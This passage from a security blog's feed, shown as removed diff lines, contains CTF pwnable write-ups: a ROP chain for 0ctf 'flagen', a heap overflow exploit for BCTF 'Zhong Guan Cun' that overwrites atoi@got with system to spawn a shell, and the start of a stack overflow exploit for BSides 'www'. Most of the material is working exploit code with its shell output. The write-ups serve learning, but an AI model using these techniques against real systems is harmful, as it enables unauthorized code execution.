-    payload += p(0x804b00d-0x5d)        # edi -&gt; read@got
-    payload += p(-1)            # ebp
-    payload += p(0x08048aff)    # 0x08048aff
-    ### third byte
-    payload += p(0x08048d8c)
-    payload += p(0xfffffff7)    # ebx, lower byte is important sprintf -&gt; system (0xab + 0x56 = 0x101) 0x56 = V == not leetified
-    payload += p(-1)            # esi
-    payload += p(0x804b00e-0x5d)        # edi -&gt; read@got
-    payload += p(-1)            # ebp
-    payload += p(0x08048aff)    # 0x08048aff
-
-    ### write 'sh;' in got
-    payload += p(0x08048d8c)
-    payload += p(0xffffff39)    # ebx, 39 (0x73 would be leetified, 0x39 and 0x3a will not)
-    payload += p(-1)            # esi
-    payload += p(0x0804b1ff-0x5d)       # edi -&gt; buf in got
-    payload += p(-1)            # ebp
-    payload += p(0x08048aff)    # 0x08048aff
-    payload += p(0x08048d8c)
-    payload += p(0xffffff3a)    # ebx, 3a 
-    payload += p(-1)            # esi
-    payload += p(0x0804b1ff-0x5d)       # edi -&gt; buf in got
-    payload += p(-1)            # ebp
-    payload += p(0x08048aff)    # 0x08048aff
-    ### write 'sh;' in got
-    payload += p(0x08048d8c)
-    payload += p(0xffffff34)    # ebx, 68 == h
-    payload += p(-1)            # esi
-    payload += p(0x0804b200-0x5d)       # edi -&gt; buf in got
-    payload += p(-1)            # ebp
-    payload += p(0x08048aff)    # 0x08048aff
-    payload += p(0x08048aff)    # 0x08048aff ; just execute the gadget twice so that 0x34 * 2 = 0x68 == 'h'
-    ### write 'sh;' in got
-    payload += p(0x08048d8c)
-    payload += p(0xffffff3b)    # ebx, 3b == ;
-    payload += p(-1)            # esi
-    payload += p(0x0804b201-0x5d)       # edi -&gt; buf in got
-    payload += p(-1)            # ebp
-    payload += p(0x08048aff)    # 0x08048aff
-    ###
-    payload += p(0x80484a0)     # read@plt -&gt; points to system()
-    payload += '1111'           # fake ret addr
-    payload += p(0x0804b1ff)    # pointer to 'sh;'
-
-    ropchain_length = len(payload)
-    adjust_with_H = ((276-len(payload))/3)
-
-    payload += 'H' * adjust_with_H  # add the correct amount of H's needed for the overflow; the pointer for strcpy() is at esp+276
-    payload += 'A' * (276-ropchain_length-adjust_with_H*3) # how many A bytes do we need to make up the buffer to exactly 276 bytes?
-    payload += p(0x804b01c) # point the strcpy to this address: stack_chk_fail@got &gt;;]
-
-    sendln(payload)
-
-    readtil('choice: ')
-    sendln('4')     # leetify
-
-    print "[+] enjoy your shell!"
-
-    t = telnetlib.Telnet()
-    t.sock = s
-    t.interact()
-
-    s.close()
-
-pwn()
-</code></pre>
-
-<pre><code>bas@tritonal:~/tmp/0ctf/flagen$ python ./exploit.py 
-
-[+] enjoy your shell!
-id
-uid=1001(flagen) gid=1001(flagen) groups=1001(flagen)
-whoami
-flagen
-cat /home/flagen/flag
-0ctf{delicious_stack_cookie_generates_flag}
-</code></pre>
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[After the Fact - BCTF Zhong Guan Cun Writeup]]></title>
-    <link href="http://barrebas.github.io/blog/2015/03/23/after-the-fact-bctf-zhong-guan-cun-writeup/"/>
-    <updated>2015-03-23T18:55:51+01:00</updated>
-    <id>http://barrebas.github.io/blog/2015/03/23/after-the-fact-bctf-zhong-guan-cun-writeup</id>
-    <content type="html"><![CDATA[<p>We&rsquo;re entering a CTF almost every weekend now, but they&rsquo;ve been really tough. I did not manage to exploit this challenge in time, but one day after the CTF ended I had an epiphany and got my exploit working. I figured I&rsquo;d share how I approached this challenge for future reference.</p>
-
-<!-- more -->
-
-
-<p>For this pwnable, called <code>Zhong guan cun</code>, we&rsquo;re given a 32-bit ELF binary and libraries. The task is to exploit it remotely and grab a flag. As said, I did not manage to grab the flag, but I got the exploit working locally.</p>
-
-<p>The binary represents some kind of online store testing program, where we&rsquo;re able to set a name and add items to the shop. Then, we can try out said shop, buying the items and asking for wholesale prices. We <em>cannot</em> modify any entry, nor delete anything after we&rsquo;ve set it.</p>
-
-<p>Playing around with the binary a bit, I noticed that it immediately quit when attempting to overflow a buffer.</p>
-
-<pre><code class="bash">*********************************
-*** Welcome to Zhong Guan Cun ***
-*********************************
-Are you dreaming of becoming a Milli$_$naire?
-Come to sell some electronics!
-
-a) Register my store
-b) Try my store
-c) Exit
-Your choice? a
-What's the name of your store? BLEH
-a) Sell a phone
-b) Sell a watch
-c) Generate a store menu
-d) Return to main menu
-Your choice? a
-Phone's name? PHONE1
-1) Android OS
-2) iOS
-3) Windows OS
-4) Blackberry OS
-5) Symbian OS
-Choose Phone's OS? 1
-Phone's price? 99999999999
-Phone's description? PHONE1
-New phone added successfully!
-a) Sell a phone
-b) Sell a watch
-c) Generate a store menu
-d) Return to main menu
-Your choice? c
-&lt;&lt;&lt; Store Name: BLEH &gt;&gt;&gt;
-=== Items in the store ===
-1) Android OS Phone PHONE1 price: 2147483647 CNY description: PHONE1
-Congraz! Your store menu is generated successfully!
-a) Sell a phone
-b) Sell a watch
-c) Generate a store menu
-d) Return to main menu
-Your choice? AAAAAAAAAAAAAAAAAAAAAAAAA
-Input is Too Long.
-$
-</code></pre>
-
-<p>I reversed the item struct. The items are stored on the heap and we can&rsquo;t have more than 16 items in total.</p>
-
-<pre><code>                .-- ptr to two function addresses
-                |             .-- start of phone/watch name, 0x20 bytes long
-                v             v
-0x8257008:  0x08049b70  0x41414141  0x41414141  0x41414141
-0x8257018:  0x41414141  0x41414141  0x41414141  0x41414141
-                              .-- start of phone/watch description, 0x50 bytes long
-                              v
-0x8257028:  0x00414141  0x42424242  0x42424242  0x42424242
-0x8257038:  0x42424242  0x42424242  0x42424242  0x42424242
-0x8257048:  0x42424242  0x42424242  0x42424242  0x42424242
-0x8257058:  0x42424242  0x42424242  0x42424242  0x42424242
-0x8257068:  0x42424242  0x42424242  0x42424242  0x42424242
-0x8257078:  0x00424242  0x000003e8
-                              ^
-                              `-- price
-</code></pre>
-
-<p>After finding the function that reads in the input, I tried to find an overflow or off-by-one vulnerability, but everything was locked down tight. There was, however, another thing that caught my attention.</p>
-
-<h2>Heaps of fun</h2>
-
-<p>We have to corrupt some piece of memory somewhere, but the items themselves are not going to cut it. We do, however, have control over the store menu string. This turned out to be the key. If I first added an item, then generated the store menu string and finally added a second item, the layout of the items and store menu on the heap was like this:</p>
-
-<pre><code>gdb-peda$ x/20wx 0x804b300
-              .-- ptr to store menu string
-              v
-0x804b300:  0x0804c088  0x00000000  0x00000000  0x00000000
-0x804b310:  0x00000000  0x00000000  0x00000000  0x00000000
-0x804b320:  0x00000000  0x00000000  0x00000000  0x00000000
-0x804b330:  0x00000000  0x00000000  0x00000000  0x00000000
-0x804b340:  0x0804c008  0x0804cbb8  0x00000000  0x00000000
-              ^           ^
-              `-- item1   |
-                          `-- item2
-    e.g. item1 | store_menu | item2
-</code></pre>
-
-<p>The store description string was in between the items on the stack. The items contained a pointer to two function address:</p>
-
-<pre><code>                .-- ptr to two function addresses
-                |             .-- start of phone/watch name, 0x20 bytes long
-                v             v
-0x8257008:  0x08049b70  0x41414141  0x41414141  0x41414141
-                   ^
-                   |
-                   `--- this value points to two functions:
-gdb-peda$ x/2wx 0x08049b70
-0x8049b70:  0x08049466  0x080492fe
-</code></pre>
-
-<p>If I could somehow overwrite that pointer of an item by overflowing the store description string, I could possible get code execution (it was nowhere near that easy, but bear with me). I started trying to generate large items, and indeed, I could overflow the function pointer of the second item using large inputs. The trick was to also set the price to a negative value, giving me just enough bytes to overflow. I whipped up a poc python script to do this for me. The layout and some functions of this poc are heavily inspired by <a href="https://gist.github.com/saelo/9e6934b3c40cf42e3f87">saelo</a>!</p>
-
-<pre><code class="python">from socket import *
-import struct, telnetlib
-
-def readtil(delim):
-    buf = b''
-    while not delim in buf:
-        buf += s.recv(1)
-    return buf
-
-def sendln(b):
-    s.send(b + b'\n')
-
-def sendbin(b):
-    s.sendall(b)
-
-def p(x):
-    return struct.pack('&lt;L', x &amp; 0xffffffff)
-
-def pwn():
-    global s
-    s=socket(AF_INET, SOCK_STREAM)
-    s.connect(('localhost', 6666))
-
-    # pause to allow gdb to attach
-    raw_input()
-
-    # register store
-    readtil('choice?')
-    sendln('a')     
-    readtil('store?')
-    sendln("S"*63)  # store name; maximum allowed, need it to overflow a buffer later!
-
-    # the program *needs* to have an item to sell before it can generate a store menu
-    readtil('choice?')
-    sendln('a')     # sell a phone
-    readtil('name?')
-    sendln('A'*0x1f)
-    readtil('OS?')
-    sendln('4')
-    readtil('price?')
-    sendln('-'+'9'*0xe)
-    readtil('description?')
-    sendln('B'*0x4f)
-
-    # generate store menu. this will be 0xb20 bytes large, on the heap. 
-    readtil('choice?')
-    sendln('c')
-
-    # second item, will be allocated after the store menu string
-    # this is the one whose function pointer we will corrupt
-    readtil('choice?')
-    sendln('a')     # sell a phone
-    readtil('name?')
-    sendln('A'*0x1f)
-    readtil('OS?')
-    sendln('4')
-    readtil('price?')
-    sendln('9'*0xf) # this will make the price of this item 0x7fffffff, ready to be abused later
-    readtil('description?')
-    sendln('B'*0x4f) 
-
-    # allocate the rest of the items
-    for i in range(13):
-        readtil('choice?')
-        sendln('a')     # sell a phone
-        readtil('name?')
-        sendln('A'*0x1f)
-        readtil('OS?')
-        sendln('4')
-        readtil('price?')
-        sendln('-'+'9'*0xe) # for these, we'll need the minus sign.
-        readtil('description?')
-        sendln('B'*0x4f)    
-
-    # overflow
-    readtil('choice?')
-    sendln('a')
-    readtil('name?')
-    sendln('A'*0x1f)
-    readtil('OS?')
-    sendln('4')
-    readtil('price?')
-    sendln('-'+'9'*0xe)
-    readtil('description?')
-    sendln('B'*(0x4f-4)+'CCCC')     # overflow with 0x43434343
-
-    readtil('choice?')
-    sendln('c') # generate store menu &amp; overflow; 2nd item now points to 0x43434343
-
-    raw_input()
-pwn()
-</code></pre>
-
-<p>And in action:</p>
-
-<pre><code>gdb-peda$ x/40x 0x804b300
-0x804b300:  0x08a50088  0x00000000  0x00000000  0x00000000
-0x804b310:  0x00000000  0x00000000  0x00000000  0x00000000
-0x804b320:  0x00000000  0x00000000  0x00000000  0x00000000
-0x804b330:  0x00000000  0x00000000  0x00000000  0x00000000
-0x804b340:  0x08a50008  0x08a50ba8  0x08a50c28  0x08a50ca8
-0x804b350:  0x08a50d28  0x08a50da8  0x08a50e28  0x08a50ea8
-0x804b360:  0x08a50f28  0x08a50fa8  0x08a51028  0x08a510a8
-0x804b370:  0x08a51128  0x08a511a8  0x08a51228  0x08a512a8
-0x804b380:  0x00000000  0x00000000  0x00000000  0x00000000
-0x804b390:  0x00000000  0x00000000  0x00000000  0x00000000
-
-# let's have a look at the second item:
-
-gdb-peda$ x/40wx 0x08a50ba8
-            .-- now overwritten!
-            v
-0x8a50ba8:  0x43434343  0x41414100  0x41414141  0x41414141
-0x8a50bb8:  0x41414141  0x41414141  0x41414141  0x41414141
-0x8a50bc8:  0x00414141  0x04b03741  0x41414108  0x41414141
-0x8a50bd8:  0x41414141  0x41414141  0x41414141  0x41414141
-0x8a50be8:  0x41414141  0x41414141  0x41414141  0x41414141
-0x8a50bf8:  0x41414141  0x41414141  0x41414141  0x41414141
-0x8a50c08:  0x41414141  0x41414141  0x41414141  0x41414141
-0x8a50c18:  0x00414141  0x7fffffff  0x00000003  0x00000081
-            .-- normal pointer
-            v
-0x8a50c28:  0x08049b70  0x41414141  0x41414141  0x41414141
-0x8a50c38:  0x41414141  0x41414141  0x41414141  0x41414141
-</code></pre>
-
-<p>I was ready to rock &amp; roll! I dumped in an address of a gadget, hoping to get code execution. There were, however, two small problems. First, the binary takes the pointer stored at the start of the item struct and then derefences it to get a second pointer to a function:</p>
-
-<pre><code>;;; triggered when asking for a wholesale price
- 8048fdd: call   804897b &lt;exit@plt+0x1ab&gt;    ; this call will be important in a few moments
- 8048fe2: pop    eax                         ; 
- 8048fe3: pop    edx                         ;
- 8048fe4: mov    eax,DWORD PTR [esi]         ; esi is *item, so this loads 0x08049b70 into eax
- 8048fe6: push   edi                         ; input for function
- 8048fe7: push   esi                         ; 
- 8048fe8: call   DWORD PTR [eax]             ; this derefences 0x08049b70, effectively calling 0x08049466
-</code></pre>
-
-<p>So I needed to have a pointer to a pointer on the heap. I had no way of leaking the heap address yet. I tried to overflow using the address of a got pointer so I could use <code>sprintf</code> to leak further information, but then the function at <code>0x8048fdd</code> reared its ugly head:</p>
-
-<pre><code> ;; strange function, opens /dev/zero, tries to read one byte and then closes it
- 804897b: push   ebp
- 804897c: mov    ebp,esp
- 804897e: push   esi
- 804897f: push   ebx
- 8048980: push   edx
- 8048981: push   edx
- 8048982: push   0x0
- 8048984: push   0x80495ce                 ; /dev/zero
- 8048989: mov    esi,DWORD PTR [ebp+0x8]
- 804898c: call   80486d0 &lt;open@plt&gt;
- 8048991: add    esp,0x10
- 8048994: test   eax,eax
- 8048996: mov    ebx,eax
- 8048998: jns    80489a4 &lt;exit@plt+0x1d4&gt;
- 804899a: sub    esp,0xc
- 804899d: push   0x1
- 804899f: call   80487d0 &lt;exit@plt&gt;
- 80489a4: push   eax
- 80489a5: push   0x1
- 80489a7: push   DWORD PTR [esi]           ; read *buf =0x8049b70
- 80489a9: push   ebx
- 80489aa: call   8048750 &lt;read@plt&gt;        ; read one byte into non-readable buffer, huh?
- 80489af: add    esp,0x10
- 80489b2: dec    eax                       ; eax = -1, of course
- 80489b3: je     804899a &lt;exit@plt+0x1ca&gt;  ; if eax was zero, the program would exit() --&gt; protection against rwxp?
- 80489b5: mov    DWORD PTR [ebp+0x8],ebx   ; ebx = fd
- 80489b8: lea    esp,[ebp-0x8]
- 80489bb: pop    ebx
- 80489bc: pop    esi
- 80489bd: pop    ebp
- 80489be: jmp    8048790 &lt;close@plt&gt;
-</code></pre>
-
-<p>I didn&rsquo;t see it at first, until I overwrote the function pointer in the item struct with a got address. This address is readable and writeable. This function then tries to read a byte from <code>/dev/zero</code> into the function pointer. If it fails, no problem, execution will happily continue. If it succeeds, however, it will immediately halt execution of the binary. I was in trouble!</p>
-
-<p>I could not call imported functions from the got, nor could I just find any old gadget. Because of the dereferencing, the address of the gadget had to be present in the binary in a non-writeable section!</p>
-
-<p>Finally, I turned to a function that was already in the binary, used for watches:</p>
-
-<pre><code>gdb-peda$ x/2wx 0x8049b60
-0x8049b60:  0x0804935e  0x0804932e
-</code></pre>
-
-<p>The first function is called when asking for a wholesale price. However, the second function at <code>0x0804932e</code> is used in the generation of the store menu.</p>
-
-<h2>Tricky overflow</h2>
-
-<p>That function at <code>0x0804932e</code> looks like this:</p>
-
-<pre><code> 804932e: push   ebp
- 804932f: mov    ebp,esp
- 8049331: sub    esp,0x10
- 8049334: mov    eax,DWORD PTR [ebp+0x8]
- 8049337: lea    edx,[eax+0x24]
- 804933a: push   edx
- 804933b: lea    edx,[eax+0x4]                   ; name
- 804933e: push   DWORD PTR [eax+0x74]            ; price
- 8049341: push   edx                             ; description
- 8049342: imul   eax,DWORD PTR [eax+0x78],0x14   ; type of watch
- 8049346: add    eax,0x804b140
- 804934b: push   eax
- 804934c: push   0x80495aa                       ; format string
- 8049351: push   DWORD PTR [ebp+0xc]             ; char *buffer: ATTACKER-SUPPLIED!
- 8049354: call   80486c0 &lt;sprintf@plt&gt;
- 8049359: add    esp,0x20
- 804935c: leave  
- 804935d: ret    
-</code></pre>
-
-<p>I chose to overwrite the function pointer in the item struct with  with <code>0x8049b64</code>. This causes the program to call <code>0x804932e</code> instead of the &lsquo;get wholesale price&rsquo;-function <strong>with an attacker supplied argument</strong>. This will allow me to overwrite a piece of memory with the generated string. If I set the description or name of an item correctly and I applied a correct offset, I could overwrite anything I want. There was some collateral damage to surrounding memory, however, making it impossible to overwrite a got pointer directly. The program contains another puzzle piece and I wanted to gain control over that instead.</p>
-
-<h2>Going for the big bucks</h2>
-
-<p>On the heap was an integer (or DWORD) that holds the amount of money that the simulated store customer has. The program substracts from this amount when a purchase is done, making it potentially a write-primitive. The <em>pointer</em> to this heap address lives at <code>0x804b280</code>. I wanted to overwrite this pointer with the address of <code>atoi@got</code>. Then, I would be able to update the pointer at <code>atoi@got</code>. Why <code>atoi</code>? Because it also uses one argument, just like <code>system</code>. If I could make <code>atoi</code> point to <code>system</code>, I had an easy way of spawning a shell. I modified the poc to do this:</p>
-
-<pre><code>from socket import *
-import struct, telnetlib
-
-def readtil(delim):
-    buf = b''
-    while not delim in buf:
-        buf += s.recv(1)
-    return buf
-
-def sendln(b):
-    s.send(b + b'\n')
-
-def sendbin(b):
-    s.sendall(b)
-
-def p(x):
-    return struct.pack('&lt;L', x &amp; 0xffffffff)
-
-def pwn():
-    global s
-    s=socket(AF_INET, SOCK_STREAM)
-    s.connect(('localhost', 6666))
-    #s.connect(('146.148.60.107', 6666))
-
-    # pause to allow gdb to attach
-    raw_input()
-
-    # register store
-    readtil('choice?')
-    sendln('a')     
-    readtil('store?')
-    # store name; maximum allowed, need it to overflow a buffer later!
-    sendln("S"*63)  
-
-    # the program *needs* to have an item to sell before it can generate a store menu
-    readtil('choice?')
-    sendln('a')
-    readtil('name?')
-    sendln('A'*0x1f)
-    readtil('OS?')
-    sendln('4')
-    readtil('price?')
-    sendln('-'+'9'*0xe)
-    readtil('description?')
-    sendln('B'*0x4f)
-
-    # generate store menu. this will be 0xb20 bytes large, on the heap. 
-    # overflow such that the store description will overwrite the second item's function pointer
-    readtil('choice?')
-    sendln('c')
-
-    # second item
-    readtil('choice?')
-    sendln('a')     # sell a phone
-    readtil('name?')
-    sendln('A'*0x1f)
-    readtil('OS?')
-    sendln('4')
-    readtil('price?')
-    sendln(''+'9'*0xf)  # this will make the price of this item 0x7fffffff, ready to be abused later
-    readtil('description?')
-    # use this later to overwrite the ptr to the money DWORD
-    sendln('A'+p(0x804b038)+'A'*(0x4f-5)) # 0x804b038 = atoi@got
-
-    # allocate the rest of the items
-    for i in range(13):
-        readtil('choice?')
-        sendln('a')
-        readtil('name?')
-        sendln('A'*0x1f)
-        readtil('OS?')
-        sendln('4')
-        readtil('price?')
-        sendln('-'+'9'*0xe)
-        readtil('description?')
-        sendln('B'*0x4f)    
-
-    # overflow
-    readtil('choice?')
-    sendln('a')
-    readtil('name?')
-    sendln('A'*0x1f)
-    readtil('OS?')
-    sendln('4')
-    readtil('price?')
-    sendln('-'+'9'*0xe)
-    readtil('description?')
-    # 0x8049b64 is a pointer to 0x0804932e
-    sendln('B'*(0x4f-4)+p(0x8049b64)) 
-
-    # generate store menu &amp; overflow; 2nd item now points to 0x8049b64: 0x0804932e -&gt; sprintf function, used to overwrite ptr to money
-    readtil('choice?')
-    sendln('c') 
-
-    readtil('choice?')
-    sendln('d')
-    readtil('choice?')
-    sendln('b')
-    print readtil('buy?')
-    sendln('2')
-    readtil('choice?')
-    # get wholesale price, trigger function 0x0804932e
-    sendln('b') 
-    readtil('buy?')
-    # this value is used as an argument for 0x0804932e, conveniently translated for us by atoi!
-    # it is 0x804b280-51, so that the output of sprintf is aligned and will overwrite the money pointer with the address of atoi@got
-    sendln('134525517') 
-    readtil('choice?')
-
-    # ok, now have control over ptr to money!
-    t = telnetlib.Telnet()
-    t.sock = s
-    t.interact()
-
-    s.close()
-
-pwn()
-</code></pre>
-
-<p>This allowed me to write to <code>atoi@got</code>! Or so I thought. The problem is that <code>atoi@got</code> contains <code>0xf74e2880</code>, which is atoi in libc. This number is interpreted by the program as a negative amount of money. When trying to modify the value at <code>atoi@got</code>, the value it contains is passed via this block of code:</p>
-
-<pre><code> 8048f6b: mov    edx,DWORD PTR ds:0x804b280 ; grab location of money DWORD from money pointer (it will point to atoi@got)
- 8048f71: imul   eax,DWORD PTR [esi+0x74]   ; eax contains amount of item to buy, multiply it by price of item
- 8048f75: mov    ecx,DWORD PTR [edx]        ; grab money amount
- 8048f77: sub    ecx,eax                    ; subtract cost from amount of money
- 8048f79: js     8049008 &lt;exit@plt+0x838&gt;   ; jump-if-sign: if the amount of leftover money is negative, abort the transaction!
-</code></pre>
-
-<p>Since I needed to modify <code>atoi</code> (0xf74e2880) to <code>system</code> (0xf74f0c30), this <code>sub ecx,eax / js</code> block above would <em>never</em> let me modify the pointer in the global offset table to <code>system</code>. Looking back, the solution is easy, but I could not figure it out late at night.</p>
-
-<h2>Take one step back</h2>
-
-<p>After the CTF had ended, it dawned on me: I did not have to modify the got pointer of <code>atoi</code> completely, I could modify <em>part</em> of it! After all, if I move one byte back, the value I would be modifying would be <code>0x4f0c30xx</code>; this is still a positive number! Of course, it is possible that <code>atoi</code> is located at an address such as <code>0xf7dff880</code>; in this case, it still would not work.</p>
-
-<p>I updated the poc once more, to make the money object point to <code>atoi@got-1</code>. I needed to add 0x50dc3000-0x4ff88000 = 14921728 to atoi so that it points to system (at least, locally, on my box). This is done by buying item 2. It&rsquo;s price is set to <code>0x7fffffff</code>. Multiplying that by 14921728 gives an integer overflow to 0xff1c5000. The latter value will be subtracted from the value at atoi-1, conveniently updating the right portion of atoi!</p>
-
-<pre><code class="python">from socket import *
-import struct, telnetlib
-
-def readtil(delim):
-    buf = b''
-    while not delim in buf:
-        buf += s.recv(1)
-    return buf
-
-def sendln(b):
-    s.send(b + b'\n')
-
-def sendbin(b):
-    s.sendall(b)
-
-def p(x):
-    return struct.pack('&lt;L', x &amp; 0xffffffff)
-
-def pwn():
-    global s
-    s=socket(AF_INET, SOCK_STREAM)
-    s.connect(('localhost', 6666))
-    #s.connect(('146.148.60.107', 6666))
-
-    # pause to allow gdb to attach
-    raw_input()
-
-    # register store
-    readtil('choice?')
-    sendln('a')     
-    readtil('store?')
-    sendln("S"*63)  # store name; maximum allowed, need it to overflow a buffer later!
-
-    # the program *needs* to have an item to sell before it can generate a store menu
-    readtil('choice?')
-    sendln('a')     # sell a phone
-    readtil('name?')
-    sendln('A'*0x1f)
-    readtil('OS?')
-    sendln('4')
-    readtil('price?')
-    sendln('-'+'9'*0xe)
-    readtil('description?')
-    sendln('B'*0x4f)
-
-    # generate store menu. this will be 0xb20 bytes large, on the heap. 
-    readtil('choice?')
-    sendln('c')
-
-    # second item
-    readtil('choice?')
-    sendln('a')     # sell a phone
-    readtil('name?')
-    sendln('A'*0x1f)
-    readtil('OS?')
-    sendln('4')
-    readtil('price?')
-    sendln(''+'9'*0xf)  # this will make the price of this item 0x7fffffff, ready to be abused later
-    readtil('description?')
-    sendln('A'+p(0x804b038-1)+'A'*(0x4f-5)) # 0x804b038 = atoi@got 
-
-    # allocate the rest of the items
-    for i in range(13):
-        readtil('choice?')
-        sendln('a')     # sell a phone
-        readtil('name?')
-        sendln('A'*0x1f)
-        readtil('OS?')
-        sendln('4')
-        readtil('price?')
-        sendln('-'+'9'*0xe)
-        readtil('description?')
-        sendln('B'*0x4f)    
-
-    # overflow
-    readtil('choice?')
-    sendln('a')
-    readtil('name?')
-    sendln('A'*0x1f)
-    readtil('OS?')
-    sendln('4')
-    readtil('price?')
-    sendln('-'+'9'*0xe)
-    readtil('description?')
-    sendln('B'*(0x4f-4)+p(0x8049b64))
-
-    readtil('choice?')
-    sendln('c') # generate store menu &amp; overflow into 2nd item
-
-    readtil('choice?')
-    sendln('d')
-    readtil('choice?')
-    sendln('b')
-    print readtil('buy?')
-    sendln('2')
-    readtil('choice?')
-    sendln('b') # get wholesale price
-    readtil('buy?')
-    sendln('134525517') # is 0x804b280-51, so that the sprintf is aligned and will overwrite the money pointer with atoi@got or snprintf@got
-    readtil('choice?')
-    sendln('a')
-    readtil('buy?')
-    sendln('14921728')  # this is the offset of atoi to system on *my* box, 58288*256 (the *256 is to compensate for the crooked ptr)
-    readtil('choice?')
-    sendln('a')
-    readtil('buy?')
-    sendln('/bin/sh;')
-
-    # ok, should have a shell by now!
-    t = telnetlib.Telnet()
-    t.sock = s
-    t.interact()
-
-    s.close()
-
-pwn()
-</code></pre>
-
-<p>The binary is running locally via <code>socat</code>. Running the python script lands a shell:</p>
-
-<pre><code class="bash">bas@tritonal:~/tmp/bctf/zhonguancun$ python ./zhong.py
-
- &lt;&lt;&lt; Store Name: SSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSS &gt;&gt;&gt;
-...snip...
-15) Blackberry OS Phone AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA price: -2147483648 CNY description: BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
-16) Blackberry OS Phone AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA price: -2147483648 CNY description: BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBd�
-Your total money: 100000 CNY.
-What do you want to buy?
- whoami
-bas
-uname -a
-Linux tritonal 3.2.0-4-amd64 #1 SMP Debian 3.2.65-1+deb7u2 x86_64 GNU/Linux
-</code></pre>
-
-<p>Unfortunately, a day too late for the CTF.</p>
-
-<h2>Conclusion</h2>
-
-<p>I had found nearly all the puzzle pieces, yet missed the final small piece. For the next CTF, I will Try Harder!</p>
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[BSides Vancouver CTF - WWW]]></title>
-    <link href="http://barrebas.github.io/blog/2015/03/18/bsides-vancouver-ctf-www/"/>
-    <updated>2015-03-18T20:36:56+01:00</updated>
-    <id>http://barrebas.github.io/blog/2015/03/18/bsides-vancouver-ctf-www</id>
-    <content type="html"><![CDATA[<p>After solving <code>sushi</code>, there were plenty of pwnables left to choose from. Next up was <code>www</code>!</p>
-
-<!-- more -->
-
-
-<p><code>www</code> was a 200 point challenge and consisted of a 32-bit Linux binary. After dealing with <code>sushi</code>, I decided to inspect the binary in <code>gdb-peda</code> right away:</p>
-
-<pre><code class="bash">gdb-peda$ checksec
-CANARY    : disabled
-FORTIFY   : disabled
-NX        : disabled
-PIE       : disabled
-RELRO     : disabled
-</code></pre>
-
-<p>Again, no protections in place. Running the binary reveals what it is trying to do:</p>
-
-<pre><code class="bash">gdb-peda$ r
-Welcome to www! Please give me two strings to have them echoed back to you!
-buffers at 0xffffd4c4 and 0xffffd3c4, ready for input!
-AAAAAA
-BBBBBB
-AAAAAA
-
-BBBBBB
-
-Stack canary created: &gt;tC[hbw]
-Better luck next time, eh?
-</code></pre>
-
-<p>Looks like it has two buffers on the stack and a custom stack canary implementation. The vulnerable function is called <code>copybuf</code>:</p>
-
-<pre><code>0804873c &lt;copybuf&gt;:
- 804873c:   55                      push   ebp
- 804873d:   89 e5                   mov    ebp,esp
- 804873f:   83 ec 38                sub    esp,0x38
- 8048742:   c7 44 24 08 09 00 00    mov    DWORD PTR [esp+0x8],0x9
- 8048749:   00 
- 804874a:   c7 44 24 04 68 9d 04    mov    DWORD PTR [esp+0x4],0x8049d68 ; canary
- 8048751:   08 
- 8048752:   8d 45 eb                lea    eax,[ebp-0x15]
- 8048755:   89 04 24                mov    DWORD PTR [esp],eax
- 8048758:   e8 c3 fe ff ff          call   8048620 &lt;strncpy@plt&gt;
- 804875d:   8b 45 08                mov    eax,DWORD PTR [ebp+0x8]
- 8048760:   89 44 24 04             mov    DWORD PTR [esp+0x4],eax
- 8048764:   8d 45 db                lea    eax,[ebp-0x25]                ; first buffer is copied here
- 8048767:   89 04 24                mov    DWORD PTR [esp],eax
- 804876a:   e8 41 fe ff ff          call   80485b0 &lt;strcpy@plt&gt;
- 804876f:   8b 45 0c                mov    eax,DWORD PTR [ebp+0xc]       ; ebp+0xc = second input
- 8048772:   89 44 24 04             mov    DWORD PTR [esp+0x4],eax          
- 8048776:   8b 45 08                mov    eax,DWORD PTR [ebp+0x8]       ; overflow this pointer with exit@got
- 8048779:   89 04 24                mov    DWORD PTR [esp],eax
- 804877c:   e8 2f fe ff ff          call   80485b0 &lt;strcpy@plt&gt;
- ; check_cookie:
- 8048781:   c7 44 24 04 68 9d 04    mov    DWORD PTR [esp+0x4],0x8049d68 ; canary
- 8048788:   08 
- 8048789:   8d 45 eb                lea    eax,[ebp-0x15]
- 804878c:   89 04 24                mov    DWORD PTR [esp],eax
- 804878f:   e8 bc fd ff ff          call   8048550 &lt;strcmp@plt&gt;
- 8048794:   89 45 f4                mov    DWORD PTR [ebp-0xc],eax
- 8048797:   83 7d f4 00             cmp    DWORD PTR [ebp-0xc],0x0
- 804879b:   74 18                   je     80487b5 &lt;copybuf+0x79&gt;        ; if canary check fails, call exit@plt -&gt; overwrite
- 804879d:   c7 04 24 30 8a 04 08    mov    DWORD PTR [esp],0x8048a30
- 80487a4:   e8 17 fe ff ff          call   80485c0 &lt;puts@plt&gt;
- 80487a9:   c7 04 24 00 00 00 00    mov    DWORD PTR [esp],0x0
- 80487b0:   e8 2b fe ff ff          call   80485e0 &lt;exit@plt&gt;
- ; cookie_OK:
- 80487b5:   c9                      leave  
- 80487b6:   c3                      ret    
-</code></pre>
-
-<p>In short, the program takes two inputs and uses <code>strcpy()</code> to copy these to the stack. However, the saved return address on the stack is protected from overwriting by a custom stack canary. The way around is to exploit the buffer overflow to overwrite one of the arguments to the second <code>strcpy()</code>: the pointer to the second buffer. If we control that pointer, we basically have a write-what-where. I chose to overflow the pointer to the second buffer with the address of <code>exit@plt</code>. This way, after overwriting the stack canary, the program will try to exit, but <code>exit@plt</code> will point to attacker-controlled shellcode on the stack.</p>
-
-<p>Putting it all together:</p>
-
-<pre><code class="python">from socket import *
-import struct, telnetlib, re
-
-def p(x):
-    return struct.pack('&lt;L', x)
-
-def pQ(x):
-    return struct.pack('&lt;Q', x)
-
-s=socket(AF_INET, SOCK_STREAM)
-#s.connect(('localhost', 17284))
-s.connect(('www.termsec.net', 17284))
-
-buf = s.recv(200)
-
-m = re.findall('(0x[0-9a-f]+)', buf)
-buf1_addr = int(m[0], 16)
